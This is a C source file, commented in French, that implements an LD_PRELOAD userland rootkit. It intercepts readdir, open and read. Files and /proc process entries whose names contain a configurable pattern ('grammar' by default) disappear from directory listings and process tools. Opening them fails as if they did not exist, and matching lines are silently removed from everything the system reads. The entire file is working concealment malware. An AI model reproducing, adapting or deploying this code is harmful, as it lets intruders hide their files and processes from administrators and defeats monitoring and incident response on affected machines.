#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <ctype.h>

#ifndef HIDDEN_FILE
#define HIDDEN_FILE "grammar"
#endif

/* Pointeurs vers les vraies fonctions */
static struct dirent *(*vraie_readdir)(DIR *) = NULL;
static int (*vraie_open)(const char *, int, ...) = NULL;
static ssize_t (*vraie_read)(int, void *, size_t) = NULL;
static FILE *(*vraie_fopen)(const char *, const char *) = NULL;

static void initialiser(void) {
    if (!vraie_readdir) vraie_readdir = dlsym(RTLD_NEXT, "readdir");
    if (!vraie_open) vraie_open = dlsym(RTLD_NEXT, "open");
    if (!vraie_read) vraie_read = dlsym(RTLD_NEXT, "read");
    if (!vraie_fopen) vraie_fopen = dlsym(RTLD_NEXT, "fopen");
}

static int faut_il_cacher(const char *nom) {
    return (strstr(nom, HIDDEN_FILE) != NULL);
}

/* Vérifie si un PID doit être caché en lisant /proc/PID/comm */
static int cacher_pid(const char *pid) {
    char chemin[256];
    char comm[256];
    FILE *f;
    
    snprintf(chemin, sizeof(chemin), "/proc/%s/comm", pid);
    f = vraie_fopen(chemin, "r");
    if (!f) return 0;
    
    if (fgets(comm, sizeof(comm), f)) {
        comm[strcspn(comm, "\n")] = 0;
        fclose(f);
        return faut_il_cacher(comm);
    }
    
    fclose(f);
    return 0;
}

/* Vérifie si une chaîne est un nombre (PID) */
static int est_nombre(const char *str) {
    if (!str || !*str) return 0;
    while (*str) {
        if (!isdigit(*str)) return 0;
        str++;
    }
    return 1;
}


/* Interception de readdir - pour ls, find et ps */
struct dirent *readdir(DIR *dossier) {
    if (!vraie_readdir) initialiser();
    
    struct dirent *entree;
    while ((entree = vraie_readdir(dossier)) != NULL) {
        /* Cacher les fichiers contenant le pattern */
        if (faut_il_cacher(entree->d_name)) {
            continue;
        }
        
        /* Cacher les processus dans /proc */
        if (est_nombre(entree->d_name) && cacher_pid(entree->d_name)) {
            continue;
        }
        
        return entree;
    }
    return NULL;
}

/* Interception de open - pour cat */
int open(const char *chemin, int flags, ...) {
    if (!vraie_open) initialiser();
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }
    
    /* Bloquer l'ouverture des fichiers cachés */
    if (faut_il_cacher(chemin)) {
        errno = ENOENT;
        return -1;
    }
    
    return vraie_open(chemin, flags, mode);
}

/* Interception de read - pour filtrer le contenu dans cat */
ssize_t read(int fd, void *buf, size_t count) {
    if (!vraie_read) initialiser();
    
    ssize_t resultat = vraie_read(fd, buf, count);
    
    if (resultat > 0 && buf) {
        char *contenu = (char *)buf;
        char *pos = contenu;
        char *fin = contenu + resultat;
        char *ecriture = contenu;
        char *debut_ligne = contenu;
        
        /* Filtrer ligne par ligne */
        while (pos < fin) {
            if (*pos == '\n') {
                size_t longueur_ligne = pos - debut_ligne + 1;
                *pos = '\0';
                
                if (!faut_il_cacher(debut_ligne)) {
                    *pos = '\n';
                    if (ecriture != debut_ligne) {
                        memmove(ecriture, debut_ligne, longueur_ligne);
                    }
                    ecriture += longueur_ligne;
                } else {
                    *pos = '\n';
                }
                
                debut_ligne = pos + 1;
            }
            pos++;
        }
        
        /* Gérer la dernière ligne si pas de \n final */
        if (debut_ligne < fin) {
            size_t longueur_ligne = fin - debut_ligne;
            char temp_char = *fin;
            if (fin < (char *)buf + count) {
                *fin = '\0';
            }
            
            if (!faut_il_cacher(debut_ligne)) {
                if (ecriture != debut_ligne) {
                    memmove(ecriture, debut_ligne, longueur_ligne);
                }
                ecriture += longueur_ligne;
            }
            
            if (fin < (char *)buf + count) {
                *fin = temp_char;
            }
        }
        
        resultat = ecriture - contenu;
    }
    
    return resultat;
}
